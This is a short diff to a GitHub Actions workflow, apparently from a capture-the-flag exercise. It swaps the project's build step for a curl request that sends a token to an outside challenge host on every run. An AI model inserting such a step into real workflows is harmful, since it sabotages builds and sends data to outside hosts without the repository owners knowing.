@@ -11,4 +11,4 @@ jobs:
     steps:
       - uses: actions/checkout@v3.0.2
       - name: Build application
-        run: ./batect build
+        run: curl https://challenge.uccuhacker.tw/nop.php?token=MzZ8a2RkY28=_f7d663f38bc772b661937cbdd3c4a7656393952c98745bfd5455eb6bc0be09d7
